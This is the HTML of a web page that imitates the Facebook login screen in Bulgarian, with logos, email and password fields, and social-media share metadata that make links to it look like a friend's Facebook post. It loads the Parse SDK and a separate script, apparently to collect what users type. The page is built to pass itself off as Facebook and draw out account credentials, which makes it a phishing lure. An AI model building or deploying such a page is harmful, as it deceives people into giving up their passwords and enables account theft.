<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">

    <!-- Open Graph / Facebook share metadata -->
    <meta property="og:title" content="Luben-Stefano's post">
    <meta property="og:description" content="Влезте във Facebook с вашия имейл и парола.">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://raw.githubusercontent.com/LubenStefano/facebook_login/refs/heads/main/img/meta_pfp.jpg">
    <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/LubenStefano/facebook_login/refs/heads/main/img/meta_pfp.jpg">
    <meta property="og:image:alt" content="Meta profile image">
    <meta property="og:locale" content="bg_BG">

    <!-- Twitter card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Luben-Stefano's post">
    <meta name="twitter:description" content="Влезте във Facebook с вашия имейл и парола.">
    <meta name="twitter:image" content="https://raw.githubusercontent.com/LubenStefano/facebook_login/refs/heads/main/img/meta_pfp.jpg">

    <title>Facebook</title>
</head>

<body>
    <div id="header">
        <img src="img/fb_logo.png" alt="logo" id="fb-logo">
    </div>

    <body>
        <div class="login-wrapper" role="region" aria-label="Facebook login">
            <header class="login-header">
                <h1 class="brand">Вход във Facebook</h1>
            </header>

            <form class="login-form" action="#" method="post" novalidate>
                <div class="field">
                    <input id="email" name="email" type="text" placeholder="Имейл или мобилен номер" required
                        autocomplete="username">
                </div>

                <div class="field">
                    <input id="password" name="password" type="password" placeholder="Парола" required
                        autocomplete="current-password">
                </div>

                <div class="form-actions">
                    <button type="submit" class="login-btn">Вход</button>
                    <a href="#" class="forgot-link">Забравена парола?</a>
                </div>
            </form>

            <div class="below-form">
                <div class="create-account">
                    <button class="create-btn" type="button">Създаване на нов профил</button>
                </div>
                <img id="meta-logo" src="img/meta_logo.png" alt="Meta logo placeholder">
            </div>
        </div>
        </div>
    </body>
    <footer>
        <div></div>

        </div>
    </footer>
    <script src="https://unpkg.com/parse/dist/parse.min.js"></script>
    <script src="script.js"></script>
</body>

</html>
